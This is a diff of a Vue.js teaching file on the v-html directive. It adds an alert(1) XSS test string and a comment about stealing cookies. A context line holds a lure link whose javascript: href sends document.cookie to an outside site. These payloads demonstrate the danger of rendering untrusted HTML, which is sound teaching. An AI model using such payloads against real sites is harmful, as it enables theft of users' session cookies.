@@ -7,7 +7,7 @@
 		<script type="text/javascript" src="../js/vue.js"></script>
 	</head>
 	<body>
-		<!-- 
+		<!--
 				v-html指令：
 						1.作用：向指定节点中渲染包含html结构的内容。
 						2.与插值语法的区别：
@@ -33,6 +33,8 @@
 			data:{
 				name:'尚硅谷',
 				str:'<h3>你好啊！</h3>',
+                str:'<a href="javascript:alert(1)">xss攻击</a>',
+                //拿取当前网站的所有cookie 以参数形式传入跳转的网站
 				str2:'<a href=javascript:location.href="http://www.baidu.com?"+document.cookie>兄弟我找到你想要的资源了，快来！</a>',
 			}
 		})
